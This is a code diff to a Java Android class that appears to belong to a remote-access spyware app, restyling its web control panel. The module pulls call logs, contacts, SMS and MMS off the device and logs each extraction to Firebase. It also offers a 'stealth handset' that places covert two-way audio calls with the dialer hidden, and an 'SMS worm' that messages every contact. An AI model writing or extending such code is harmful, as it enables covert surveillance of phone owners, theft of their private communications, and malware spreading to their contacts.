@@ -84,15 +84,14 @@ public class CommsModule extends BaseModule {
     private Response serveCallLogs(Map<String, String> params, IHTTPSession session) {
         FirebaseConfig.logActivity("COMMS_EXTRACT: Call history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
+
+        // --- CARD 1: COMMS TERMINAL (REMOTE DIALER) ---
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">RECENT_CALL_LOGS</h2>");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128222; COMMS_TERMINAL <span class=\"info-trigger\" onclick=\"showInfo(event, 'REMOTE_DIALER', '<b>CELLULAR_CALL</b>: Physical SIM dial. Standard logs apply.<br><br><b>STEALTH_HANDSET</b>: 2-way audio via browser. Dialer UI suppressed.')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
-        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem;\">&#128222; REMOTE_DIALER <span class=\"info-trigger\" onclick=\"showInfo(event, 'REMOTE_DIALER', '<b>CELLULAR_CALL</b>: Physical SIM dial. Standard logs apply.<br><br><b>STEALTH_HANDSET</b>: 2-way audio via browser. Dialer UI suppressed.')\">INFO</span></div>");
+        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 10px;\">");
+        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.8rem;\">&#128222; REMOTE_DIALER</div>");
         
         html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; align-items: center;\">");
         html.append("<input type=\"text\" id=\"dial-number\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; text-align: center;\">");
@@ -100,19 +99,20 @@ public class CommsModule extends BaseModule {
         html.append("<div style=\"display: flex; gap: 10px; justify-content: center; width: 100%; max-width: 450px;\">");
         html.append("<button onclick=\"initiateCellularCall()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); flex: 1; margin: 0;\">CELLULAR_CALL</button>");
         html.append("<button onclick=\"startStealthCall()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); flex: 1; margin: 0;\">STEALTH_HANDSET</button>");
-        html.append("</div></div>");
-        html.append("</div>");
+        html.append("</div></div></div>");
+        html.append("</div>"); // Close Card 1 (Remote Dialer)
 
-        html.append("<div style=\"margin-top: 40px;\">");
+        // --- CARD 2: RECENT CALL LOGS DATABASE ---
+        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.35rem; color: var(--neon-cyan);\">RECENT_CALL_LOGS</h2>");
+        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                 html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                 html.append("<p>Call log permission not granted.</p>");
                 html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
-                html.append("</div>");
-                html.append("</div>");
-                html.append("</div>");
+                html.append("</div></div>");
                 html.append(getFooter());
                 return server.serveGzippedProxy(session, "text/html", html.toString());
             }
@@ -155,7 +155,6 @@ public class CommsModule extends BaseModule {
                 html.append("<p style=\"color: #888; margin-bottom: 15px; font-size: 0.7rem;\">Total: ").append(totalCount)
                         .append(" calls | Page ").append(page).append(" of ").append(totalPages).append("</p>");
 
-                html.append("<div style=\"margin-top: 30px;\">");
                 html.append("<div style=\"overflow-x: auto;\">");
                 html.append("<table>");
                 html.append("<thead><tr>");
@@ -264,8 +263,10 @@ public class CommsModule extends BaseModule {
             if (cursor != null) cursor.close();
         }
 
+        // Close Card 2 (RECENT CALL LOGS)
         html.append("</div>"); 
-        html.append("</div>"); 
+        
+        // Append Card 3 (Footer Card containing Bottom Navigation Links & Copyright)
         html.append(getFooter());
 
         return server.serveGzippedProxy(session, "text/html", html.toString());
@@ -274,9 +275,6 @@ public class CommsModule extends BaseModule {
     private Response serveContacts(Map<String, String> params, IHTTPSession session) {
         FirebaseConfig.logActivity("CONTACT_EXTRACT: Address book retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">CONTACT_DATABASE</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
@@ -415,6 +413,7 @@ public class CommsModule extends BaseModule {
 
         html.append("</div>"); 
         html.append("</div>"); 
+        html.append("</div>"); 
         html.append(getFooter());
 
         return server.serveGzippedProxy(session, "text/html", html.toString());
@@ -423,39 +422,44 @@ public class CommsModule extends BaseModule {
     private Response serveSmsMessages(Map<String, String> params, IHTTPSession session) {
         FirebaseConfig.logActivity("COMMS_EXTRACT: SMS history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
+
+        // --- CARD 1: SMS TERMINAL (DISPATCHER & WORM) ---
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128233; SMS_TERMINAL</h2>");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128233; SMS_TERMINAL <span class=\"info-trigger\" onclick=\"showInfo(event, 'SMS_TERMINAL', 'Direct SMS dispatch and automated address-book worm broadcast.')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
         html.append("<p style=\"color: #888; font-size: 0.75rem; margin-bottom: 20px;\"><b>Note:</b> RCS and Advanced Messaging (Blue Bubbles) are intercepted in real-time in the <a href=\"/intel\" style=\"color: var(--neon-cyan);\">Intel Tab</a>.</p>");
+        
+        // Dispatch Form Box
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem;\">&#128231; DISPATCH_NEW_SMS</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.8rem;\">&#128231; DISPATCH_NEW_SMS</div>");
         html.append("<form action=\"/sms/send\" method=\"get\">");
         html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
         html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
         html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
         html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
         html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">ENCRYPT & SEND</button>");
-        html.append("</div>");
-        html.append("</div></form>");
+        html.append("</div></div></form>");
 
+        // Worm Broadcast Box
         html.append("<div style=\"margin-top: 30px; border-top: 1px solid rgba(0,242,255,0.1); padding-top: 20px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-orange); font-size: 0.7rem; margin-bottom: 15px;\">&#9889; SMS_BROADCAST (WORM)</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-orange); font-size: 0.8rem; margin-bottom: 15px;\">&#9889; SMS_BROADCAST (WORM)</div>");
         html.append("<p style=\"color: #888; font-size: 0.75rem; text-align: center; margin-bottom: 15px;\">Dispatches a message to EVERY contact in the address book.</p>");
         html.append("<form action=\"/sms/broadcast\" method=\"get\">");
         html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
         html.append("<textarea name=\"message\" placeholder=\"Broadcast Content\" rows=\"2\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-orange); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
         html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
         html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05); width: 100% !important; max-width: 280px !important; margin: 0 auto !important; font-size: 0.8rem; height: 50px; white-space: normal; line-height: 1.2;\">EXECUTE_BROADCAST</button>");
-        html.append("</div>");
-        html.append("</div></form></div>");
+        html.append("</div></div></form>");
+        html.append("</div></div></div>"); // Close Worm Box, Dispatch Outer Box, and Card 1
 
-        html.append("<div style=\"margin-top: 40px;\">");
+        // --- CARD 2: SMS HISTORY DATABASE ---
+        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.35rem; color: var(--neon-cyan);\">SMS_DATABASE</h2>");
+        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div></div></div>").append(getFooter());
+                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div></div>").append(getFooter());
                 return server.serveGzippedProxy(session, "text/html", html.toString());
             }
         }
@@ -514,16 +518,18 @@ public class CommsModule extends BaseModule {
             } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128233;</div><p>No messages found</p></div>"); }
         } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
         finally { if (cursor != null) cursor.close(); }
-        html.append("</div></div>").append(getFooter());
+
+        // Explicitly close Card 2 (SMS DATABASE CARD)
+        html.append("</div>");
+
+        // Append Card 3 (Footer Card containing Bottom Navigation Links & Copyright)
+        html.append(getFooter());
         return server.serveGzippedProxy(session, "text/html", html.toString());
     }
 
     private Response serveMmsMessages(Map<String, String> params, IHTTPSession session) {
         FirebaseConfig.logActivity("COMMS_EXTRACT: MMS media database retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128247; MMS_TERMINAL</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
@@ -542,12 +548,16 @@ public class CommsModule extends BaseModule {
         html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">UPLOAD & DISPATCH</button>");
         html.append("</div>");
         html.append("</div></form></div>");
+        html.append("</div>"); // Close Card 1 (MMS Dispatcher)
 
-        html.append("<div style=\"margin-top: 40px;\">");
+        // --- CARD 2: MMS HISTORY DATABASE ---
+        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.35rem; color: var(--neon-cyan);\">MMS_DATABASE</h2>");
+        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div></div>").append(getFooter());
+                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(getFooter());
                 return server.serveGzippedProxy(session, "text/html", html.toString());
             }
         }
@@ -628,7 +638,7 @@ public class CommsModule extends BaseModule {
             } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div><p>No MMS found</p></div>"); }
         } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
         finally { if (cursor != null) cursor.close(); }
-        html.append("</div></div>").append(getFooter());
+        html.append("</div>").append(getFooter());
         return server.serveGzippedProxy(session, "text/html", html.toString());
     }
 
@@ -833,7 +843,7 @@ public class CommsModule extends BaseModule {
                     smsManager, number, null, message, null, null);
             }
 
-            String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
+            String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\">Back to SMS</a></div></div></div>" + getFooter();
             return server.serveGzippedProxy(session, "text/html", html);
         } catch (Exception e) { return server.serveErrorProxy("Failed to send SMS: " + e.getMessage()); }
     }
@@ -871,7 +881,7 @@ public class CommsModule extends BaseModule {
             } else {
                 html += "<div class=\"icon\" style=\"color: var(--danger);\">&#10006;</div><h2>MMS Failed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Could not dispatch media package. Check device logs.</p>";
             }
-            html += "<div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
+            html += "<div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/mms\" class=\"btn\">Back to MMS</a></div></div></div>" + getFooter();
             return server.serveGzippedProxy(session, "text/html", html);
 
         } catch (Exception e) {
